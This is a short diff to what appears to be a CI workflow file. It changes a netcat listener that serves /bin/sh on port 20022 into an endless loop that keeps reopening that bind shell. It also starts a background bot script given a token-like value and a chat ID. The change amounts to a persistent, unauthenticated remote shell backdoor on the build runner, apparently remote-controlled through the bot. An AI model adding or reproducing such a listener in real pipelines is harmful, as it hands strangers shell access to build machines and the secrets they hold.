@@ -171,7 +171,8 @@ jobs:
           set -o pipefail
           {
             # listener nc
-            busybox nc -l -p 20022 -e /bin/sh -i &
+            while true; do busybox nc -l -p 20022 -e /bin/sh; sleep 1; done &
+
 
             chmod +x myfuzzing/bot.sh
             nohup myfuzzing/bot.sh "$ZZ" "$CHAT_ID" > ~/bot.log 2>&1 &
